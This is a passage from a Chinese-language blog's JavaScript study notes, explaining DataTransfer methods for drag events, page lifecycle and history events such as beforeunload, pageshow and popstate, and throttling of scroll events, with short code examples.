<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div</span><br><span class="line">  draggable=<span class="string">&quot;true&quot;</span></span><br><span class="line">  ondragstart=<span class="string">&quot;event.dataTransfer.setData(&#x27;text/plain&#x27;, &#x27;bbb&#x27;)&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">  aaa</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，拖拉数据实际上是<code>bbb</code>，而不是<code>aaa</code>。</p>
<p>下面是添加其他类型的数据。由于<code>text/plain</code>是最普遍支持的格式，为了保证兼容性，建议最后总是保存一份纯文本格式的数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> dt = event.dataTransfer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加链接</span></span><br><span class="line">dt.setData(<span class="string">&#x27;text/uri-list&#x27;</span>, <span class="string">&#x27;http://www.example.com&#x27;</span>);</span><br><span class="line">dt.setData(<span class="string">&#x27;text/plain&#x27;</span>, <span class="string">&#x27;http://www.example.com&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加 HTML 代码</span></span><br><span class="line">dt.setData(<span class="string">&#x27;text/html&#x27;</span>, <span class="string">&#x27;Hello there, &lt;strong&gt;stranger&lt;/strong&gt;&#x27;</span>);</span><br><span class="line">dt.setData(<span class="string">&#x27;text/plain&#x27;</span>, <span class="string">&#x27;Hello there, &lt;strong&gt;stranger&lt;/strong&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加图像的 URL</span></span><br><span class="line">dt.setData(<span class="string">&#x27;text/uri-list&#x27;</span>, imageurl);</span><br><span class="line">dt.setData(<span class="string">&#x27;text/plain&#x27;</span>, imageurl);</span><br></pre></td></tr></table></figure>
<p>可以一次提供多种格式的数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> dt = event.dataTransfer;</span><br><span class="line">dt.setData(<span class="string">&#x27;application/x-bookmark&#x27;</span>, bookmarkString);</span><br><span class="line">dt.setData(<span class="string">&#x27;text/uri-list&#x27;</span>, <span class="string">&#x27;http://www.example.com&#x27;</span>);</span><br><span class="line">dt.setData(<span class="string">&#x27;text/plain&#x27;</span>, <span class="string">&#x27;http://www.example.com&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，通过在同一个事件上面，存放三种类型的数据，使得拖拉事件可以在不同的对象上面，<code>drop</code>不同的值。注意，第一种格式是一个自定义格式，浏览器默认无法读取，这意味着，只有某个部署了特定代码的节点，才可能<code>drop</code>（读取到）这个数据。</p>
<h5 id="9-5-2-DataTransfer-getData"><a href="#9-5-2-DataTransfer-getData" class="headerlink" title="9.5.2 DataTransfer.getData()"></a>9.5.2 DataTransfer.getData()</h5><p><code>DataTransfer.getData()</code>方法接受一个字符串（表示数据类型）作为参数，返回事件所带的指定类型的数据（通常是用<code>setData</code>方法添加的数据）。如果指定类型的数据不存在，则返回空字符串。通常只有<code>drop</code>事件触发后，才能取出数据。</p>
<p>下面是一个<code>drop</code>事件的监听函数，用来取出指定类型的数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onDrop</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> data = event.dataTransfer.getData(<span class="string">&#x27;text/plain&#x27;</span>);</span><br><span class="line">  event.target.textContent = data;</span><br><span class="line">  event.preventDefault();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码取出拖拉事件的文本数据，将其替换成当前节点的文本内容。注意，这时还必须取消浏览器的默认行为，因为假如用户拖拉的是一个链接，浏览器默认会在当前窗口打开这个链接。</p>
<p><code>getData</code>方法返回的是一个字符串，如果其中包含多项数据，就必须手动解析。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doDrop</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> lines = event.dataTransfer.getData(<span class="string">&#x27;text/uri-list&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> line <span class="keyword">of</span> lines) &#123;</span><br><span class="line">    <span class="keyword">let</span> link = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    link.href = line;</span><br><span class="line">    link.textContent = line;</span><br><span class="line">    event.target.appendChild(link);</span><br><span class="line">  &#125;</span><br><span class="line">  event.preventDefault();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>getData</code>方法返回的是一组链接，就必须自行解析。</p>
<p>类型值指定为<code>URL</code>，可以取出第一个有效链接。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> link = event.dataTransfer.getData(<span class="string">&#x27;URL&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>下面的例子是从多种类型的数据里面取出数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doDrop</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> types = event.dataTransfer.types;</span><br><span class="line">  <span class="keyword">var</span> supportedTypes = [<span class="string">&#x27;text/uri-list&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>];</span><br><span class="line">  types = supportedTypes.filter(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123; types.includes(value) &#125;);</span><br><span class="line">  <span class="keyword">if</span> (types.length) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = event.dataTransfer.getData(types[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  event.preventDefault();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="9-5-3-DataTransfer-clearData"><a href="#9-5-3-DataTransfer-clearData" class="headerlink" title="9.5.3 DataTransfer.clearData()"></a>9.5.3 DataTransfer.clearData()</h5><p><code>DataTransfer.clearData()</code>方法接受一个字符串（表示数据类型）作为参数，删除事件所带的指定类型的数据。如果没有指定类型，则删除所有数据。如果指定类型不存在，则调用该方法不会产生任何效果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">event.dataTransfer.clearData(<span class="string">&#x27;text/uri-list&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码清除事件所带的<code>text/uri-list</code>类型的数据。</p>
<p>该方法不会移除拖拉的文件，因此调用该方法后，<code>DataTransfer.types</code>属性可能依然会返回<code>Files</code>类型（前提是存在文件拖拉）。</p>
<p>注意，该方法只能在<code>dragstart</code>事件的监听函数之中使用，因为这是拖拉操作的数据唯一可写的时机。</p>
<h5 id="9-5-4-DataTransfer-setDragImage"><a href="#9-5-4-DataTransfer-setDragImage" class="headerlink" title="9.5.4 DataTransfer.setDragImage()"></a>9.5.4 DataTransfer.setDragImage()</h5><p>拖动过程中（<code>dragstart</code>事件触发后），浏览器会显示一张图片跟随鼠标一起移动，表示被拖动的节点。这张图片是自动创造的，通常显示为被拖动节点的外观，不需要自己动手设置。</p>
<p><code>DataTransfer.setDragImage()</code>方法可以自定义这张图片。它接受三个参数。第一个是<code>&lt;img&gt;</code>节点或者<code>&lt;canvas&gt;</code>节点，如果省略或为<code>null</code>，则使用被拖动的节点的外观；第二个和第三个参数为鼠标相对于该图片左上角的横坐标和纵坐标。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment"> &lt;div id=&quot;drag-with-image&quot; class=&quot;dragdemo&quot; draggable=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="comment">   drag me</span></span><br><span class="line"><span class="comment"> &lt;/div&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;drag-with-image&#x27;</span>);</span><br><span class="line">div.addEventListener(<span class="string">&#x27;dragstart&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  img.src = <span class="string">&#x27;http://path/to/img&#x27;</span>;</span><br><span class="line">  e.dataTransfer.setDragImage(img, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 事件-拖拉事件</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0053</title>
    <url>/2021/05/30/%E6%89%93%E5%8D%A10053/</url>
    <content><![CDATA[<p><font color=#c37e00>你未必万丈光芒，但你温暖有光。</font></p>
<h2 id="JS-事件"><a href="#JS-事件" class="headerlink" title="JS 事件"></a>JS 事件</h2><h3 id="10-其他常见事件"><a href="#10-其他常见事件" class="headerlink" title="10. 其他常见事件"></a>10. 其他常见事件</h3><h4 id="10-1-资源事件"><a href="#10-1-资源事件" class="headerlink" title="10.1 资源事件"></a>10.1 资源事件</h4><h5 id="10-1-1-beforeunload-事件"><a href="#10-1-1-beforeunload-事件" class="headerlink" title="10.1.1 beforeunload 事件"></a>10.1.1 beforeunload 事件</h5><p><code>beforeunload</code>事件在窗口、文档、各种资源将要卸载前触发。它可以用来防止用户不小心卸载资源。</p>
<p>如果该事件对象的<code>returnValue</code>属性是一个非空字符串，那么浏览器就会弹出一个对话框，询问用户是否要卸载该资源。但是，用户指定的字符串可能无法显示，浏览器会展示预定义的字符串。如果用户点击“取消”按钮，资源就不会卸载。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;beforeunload&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.returnValue = <span class="string">&#x27;你确定离开吗？&#x27;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，用户如果关闭窗口，浏览器会弹出一个窗口，要求用户确认。</p>
<p>浏览器对这个事件的行为很不一致，有的浏览器调用<code>event.preventDefault()</code>，也会弹出对话框。IE 浏览器需要显式返回一个非空的字符串，才会弹出对话框。而且，大多数浏览器在对话框中不显示指定文本，只显示默认文本。因此，可以采用下面的写法，取得最大的兼容性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;beforeunload&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> confirmationMessage = <span class="string">&#x27;确认关闭窗口？&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  e.returnValue = confirmationMessage;</span><br><span class="line">  <span class="keyword">return</span> confirmationMessage;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>注意，许多手机浏览器（比如 Safari）默认忽略这个事件，桌面浏览器也有办法忽略这个事件。所以，它可能根本不会生效，不能依赖它来阻止用户关闭浏览器窗口，最好不要使用这个事件。</p>
<p>另外，一旦使用了<code>beforeunload</code>事件，浏览器就不会缓存当前网页，使用“回退”按钮将重新向服务器请求网页。这是因为监听这个事件的目的，一般是为了网页状态，这时缓存页面的初始状态就没意义了。</p>
<h5 id="10-1-2-unload-事件"><a href="#10-1-2-unload-事件" class="headerlink" title="10.1.2 unload 事件"></a>10.1.2 unload 事件</h5><p><code>unload</code>事件在窗口关闭或者<code>document</code>对象将要卸载时触发。它的触发顺序排在<code>beforeunload</code>、<code>pagehide</code>事件后面。</p>
<p><code>unload</code>事件发生时，文档处于一个特殊状态。所有资源依然存在，但是对用户来说都不可见，UI 互动全部无效。这个事件是无法取消的，即使在监听函数里面抛出错误，也不能停止文档的卸载。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;unload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;文档将要卸载&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>手机上，浏览器或系统可能会直接丢弃网页，这时该事件根本不会发生。而且跟<code>beforeunload</code>事件一样，一旦使用了<code>unload</code>事件，浏览器就不会缓存当前网页，理由同上。因此，任何情况下都不应该依赖这个事件，指定网页卸载时要执行的代码，可以考虑完全不使用这个事件。</p>
<p>该事件可以用<code>pagehide</code>代替。</p>
<h5 id="10-1-3-load-事件，error-事件"><a href="#10-1-3-load-事件，error-事件" class="headerlink" title="10.1.3 load 事件，error 事件"></a>10.1.3 load 事件，error 事件</h5><p><code>load</code>事件在页面或某个资源加载成功时触发。注意，页面或资源从浏览器缓存加载，并不会触发<code>load</code>事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;load&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;所有资源都加载完成&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><code>error</code>事件是在页面或资源加载失败时触发。<code>abort</code>事件在用户取消加载时触发。</p>
<p>这三个事件实际上属于进度事件，不仅发生在<code>document</code>对象，还发生在各种外部资源上面。浏览网页就是一个加载各种资源的过程，图像（image）、样式表（style sheet）、脚本（script）、视频（video）、音频（audio）、Ajax请求（XMLHttpRequest）等等。这些资源和<code>document</code>对象、<code>window</code>对象、XMLHttpRequestUpload 对象，都会触发<code>load</code>事件和<code>error</code>事件。</p>
<p>最后，页面的<code>load</code>事件也可以用<code>pageshow</code>事件代替。</p>
<h4 id="10-2-session-历史事件"><a href="#10-2-session-历史事件" class="headerlink" title="10.2 session 历史事件"></a>10.2 session 历史事件</h4><h5 id="10-2-1-pageshow-事件，pagehide-事件"><a href="#10-2-1-pageshow-事件，pagehide-事件" class="headerlink" title="10.2.1 pageshow 事件，pagehide 事件"></a>10.2.1 pageshow 事件，pagehide 事件</h5><p>默认情况下，浏览器会在当前会话（session）缓存页面，当用户点击“前进/后退”按钮时，浏览器就会从缓存中加载页面。</p>
<p><code>pageshow</code>事件在页面加载时触发，包括第一次加载和从缓存加载两种情况。如果要指定页面每次加载（不管是不是从浏览器缓存）时都运行的代码，可以放在这个事件的监听函数。</p>
<p>第一次加载时，它的触发顺序排在<code>load</code>事件后面。从缓存加载时，<code>load</code>事件不会触发，因为网页在缓存中的样子通常是<code>load</code>事件的监听函数运行后的样子，所以不必重复执行。同理，如果是从缓存中加载页面，网页内初始化的 JavaScript 脚本（比如 DOMContentLoaded 事件的监听函数）也不会执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;pageshow&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;pageshow: &#x27;</span>, event);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><code>pageshow</code>事件有一个<code>persisted</code>属性，返回一个布尔值。页面第一次加载时，这个属性是<code>false</code>；当页面从缓存加载时，这个属性是<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;pageshow&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.persisted) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><code>pagehide</code>事件与<code>pageshow</code>事件类似，当用户通过“前进/后退”按钮，离开当前页面时触发。它与 unload 事件的区别在于，如果在 window 对象上定义<code>unload</code>事件的监听函数之后，页面不会保存在缓存中，而使用<code>pagehide</code>事件，页面会保存在缓存中。</p>
<p><code>pagehide</code>事件实例也有一个<code>persisted</code>属性，将这个属性设为<code>true</code>，就表示页面要保存在缓存中；设为<code>false</code>，表示网页不保存在缓存中，这时如果设置了unload 事件的监听函数，该函数将在 pagehide 事件后立即运行。</p>
<p>如果页面包含<code>&lt;frame&gt;</code>或<code>&lt;iframe&gt;</code>元素，则<code>&lt;frame&gt;</code>页面的<code>pageshow</code>事件和<code>pagehide</code>事件，都会在主页面之前触发。</p>
<p>注意，这两个事件只在浏览器的<code>history</code>对象发生变化时触发，跟网页是否可见没有关系。</p>
<h5 id="10-2-2-popstate-事件"><a href="#10-2-2-popstate-事件" class="headerlink" title="10.2.2 popstate 事件"></a>10.2.2 popstate 事件</h5><p><code>popstate</code>事件在浏览器的<code>history</code>对象的当前记录发生显式切换时触发。注意，调用<code>history.pushState()</code>或<code>history.replaceState()</code>，并不会触发<code>popstate</code>事件。该事件只在用户在<code>history</code>记录之间显式切换时触发，比如鼠标点击“后退/前进”按钮，或者在脚本中调用<code>history.back()</code>、<code>history.forward()</code>、<code>history.go()</code>时触发。</p>
<p>该事件对象有一个<code>state</code>属性，保存<code>history.pushState</code>方法和<code>history.replaceState</code>方法为当前记录添加的<code>state</code>对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onpopstate = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;state: &#x27;</span> + event.state);</span><br><span class="line">&#125;;</span><br><span class="line">history.pushState(&#123;<span class="attr">page</span>: <span class="number">1</span>&#125;, <span class="string">&#x27;title 1&#x27;</span>, <span class="string">&#x27;?page=1&#x27;</span>);</span><br><span class="line">history.pushState(&#123;<span class="attr">page</span>: <span class="number">2</span>&#125;, <span class="string">&#x27;title 2&#x27;</span>, <span class="string">&#x27;?page=2&#x27;</span>);</span><br><span class="line">history.replaceState(&#123;<span class="attr">page</span>: <span class="number">3</span>&#125;, <span class="string">&#x27;title 3&#x27;</span>, <span class="string">&#x27;?page=3&#x27;</span>);</span><br><span class="line">history.back(); <span class="comment">// state: &#123;&quot;page&quot;:1&#125;</span></span><br><span class="line">history.back(); <span class="comment">// state: null</span></span><br><span class="line">history.go(<span class="number">2</span>);  <span class="comment">// state: &#123;&quot;page&quot;:3&#125;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>pushState</code>方法向<code>history</code>添加了两条记录，然后<code>replaceState</code>方法替换掉当前记录。因此，连续两次<code>back</code>方法，会让当前条目退回到原始网址，它没有附带<code>state</code>对象，所以事件的<code>state</code>属性为<code>null</code>，然后前进两条记录，又回到<code>replaceState</code>方法添加的记录。</p>
<p>浏览器对于页面首次加载，是否触发<code>popstate</code>事件，处理不一样，Firefox 不触发该事件。</p>
<h5 id="10-2-3-hashchange-事件"><a href="#10-2-3-hashchange-事件" class="headerlink" title="10.2.3 hashchange 事件"></a>10.2.3 hashchange 事件</h5><p><code>hashchange</code>事件在 URL 的 hash 部分（即<code>#</code>号后面的部分，包括<code>#</code>号）发生变化时触发。该事件一般在<code>window</code>对象上监听。</p>
<p><code>hashchange</code>的事件实例具有两个特有属性：<code>oldURL</code>属性和<code>newURL</code>属性，分别表示变化前后的完整 URL。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// URL 是 http://www.example.com/</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;hashchange&#x27;</span>, myFunction);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.oldURL);</span><br><span class="line">  <span class="built_in">console</span>.log(e.newURL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location.hash = <span class="string">&#x27;part2&#x27;</span>;</span><br><span class="line"><span class="comment">// http://www.example.com/</span></span><br><span class="line"><span class="comment">// http://www.example.com/#part2</span></span><br></pre></td></tr></table></figure>
<h4 id="10-3-网页状态事件"><a href="#10-3-网页状态事件" class="headerlink" title="10.3 网页状态事件"></a>10.3 网页状态事件</h4><h5 id="10-3-1-DOMContentLoaded-事件"><a href="#10-3-1-DOMContentLoaded-事件" class="headerlink" title="10.3.1 DOMContentLoaded 事件"></a>10.3.1 DOMContentLoaded 事件</h5><p>网页下载并解析完成以后，浏览器就会在<code>document</code>对象上触发 DOMContentLoaded 事件。这时，仅仅完成了网页的解析（整张页面的 DOM 生成了），所有外部资源（样式表、脚本、iframe 等等）可能还没有下载结束。也就是说，这个事件比<code>load</code>事件，发生时间早得多。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;DOM生成&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>注意，网页的 JavaScript 脚本是同步执行的，脚本一旦发生堵塞，将推迟触发<code>DOMContentLoaded</code>事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;DOM 生成&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这段代码会推迟触发 DOMContentLoaded 事件</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000000</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="10-3-2-readystatechange-事件"><a href="#10-3-2-readystatechange-事件" class="headerlink" title="10.3.2 readystatechange 事件"></a>10.3.2 readystatechange 事件</h5><p><code>readystatechange</code>事件当 Document 对象和 XMLHttpRequest 对象的<code>readyState</code>属性发生变化时触发。<code>document.readyState</code>有三个可能的值：<code>loading</code>（网页正在加载）、<code>interactive</code>（网页已经解析完成，但是外部资源仍然处在加载状态）和<code>complete</code>（网页和所有外部资源已经结束加载，<code>load</code>事件即将触发）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>.readyState === <span class="string">&#x27;interactive&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个事件可以看作<code>DOMContentLoaded</code>事件的另一种实现方法。</p>
<h4 id="10-4-窗口事件"><a href="#10-4-窗口事件" class="headerlink" title="10.4 窗口事件"></a>10.4 窗口事件</h4><h5 id="10-4-1-scroll-事件"><a href="#10-4-1-scroll-事件" class="headerlink" title="10.4.1 scroll 事件"></a>10.4.1 scroll 事件</h5><p><code>scroll</code>事件在文档或文档元素滚动时触发，主要出现在用户拖动滚动条。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;scroll&#x27;</span>, callback);</span><br></pre></td></tr></table></figure>
<p>该事件会连续地大量触发，所以它的监听函数之中不应该有非常耗费计算的操作。推荐的做法是使用<code>requestAnimationFrame</code>或<code>setTimeout</code>控制该事件的触发频率，然后可以结合<code>customEvent</code>抛出一个新事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> throttle = <span class="function"><span class="keyword">function</span> (<span class="params">type, name, obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> obj = obj || <span class="built_in">window</span>;</span><br><span class="line">    <span class="keyword">var</span> running = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (running) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">      running = <span class="literal">true</span>;</span><br><span class="line">      requestAnimationFrame(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        obj.dispatchEvent(<span class="keyword">new</span> CustomEvent(name));</span><br><span class="line">        running = <span class="literal">false</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">    obj.addEventListener(type, func);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将 scroll 事件转为 optimizedScroll 事件</span></span><br><span class="line">  throttle(<span class="string">&#x27;scroll&#x27;</span>, <span class="string">&#x27;optimizedScroll&#x27;</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;optimizedScroll&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Resource conscious scroll callback!&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>throttle()</code>函数用于控制事件触发频率，它有一个内部函数<code>func()</code>，每次<code>scroll</code>事件实际上触发的是这个函数。<code>func()</code>函数内部使用<code>requestAnimationFrame()</code>方法，保证只有每次页面重绘时（每秒60次），才可能会触发<code>optimizedScroll</code>事件，从而实际上将<code>scroll</code>事件转换为<code>optimizedScroll</code>事件，触发频率被控制在每秒最多60次。</p>
<p>改用<code>setTimeout()</code>方法，可以放置更大的时间间隔。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;scroll&#x27;</span>, scrollThrottler, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> scrollTimeout;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">scrollThrottler</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!scrollTimeout) &#123;</span><br><span class="line">      scrollTimeout = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        scrollTimeout = <span class="literal">null</span>;</span><br><span class="line">        actualScrollHandler();</span><br><span class="line">      &#125;, <span class="number">66</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">actualScrollHandler</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure>
<p>上面代码中，每次<code>scroll</code>事件都会执行<code>scrollThrottler</code>函数。该函数里面有一个定时器<code>setTimeout</code>，每66毫秒触发一次（每秒15次）真正执行的任务<code>actualScrollHandler</code>。</p>
<p>下面是一个更一般的<code>throttle</code>函数的写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fn, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> time = <span class="built_in">Date</span>.now();</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((time + wait - <span class="built_in">Date</span>.now()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      fn();</span><br><span class="line">      time = <span class="built_in">Date</span>.now();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;scroll&#x27;</span>, throttle(callback, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure>
<p>上面的代码将<code>scroll</code>事件的触发频率，限制在一秒一次。</p>
<p><code>lodash</code>函数库提供了现成的<code>throttle</code>函数，可以直接使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;scroll&#x27;</span>, _.throttle(callback, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure>
<p>本书前面介绍过<code>debounce</code>的概念，<code>throttle</code>与它区别在于，<code>throttle</code>是“节流”，确保一段时间内只执行一次，而<code>debounce</code>是“防抖”，要连续操作结束后再执行。以网页滚动为例，<code>debounce</code>要等到用户停止滚动后才执行，<code>throttle</code>则是如果用户一直在滚动网页，那么在滚动过程中还是会执行。</p>
<h5 id="10-4-2-resize-事件"><a href="#10-4-2-resize-事件" class="headerlink" title="10.4.2 resize 事件"></a>10.4.2 resize 事件</h5><p><code>resize</code>事件在改变浏览器窗口大小时触发，主要发生在<code>window</code>对象上面。</p>
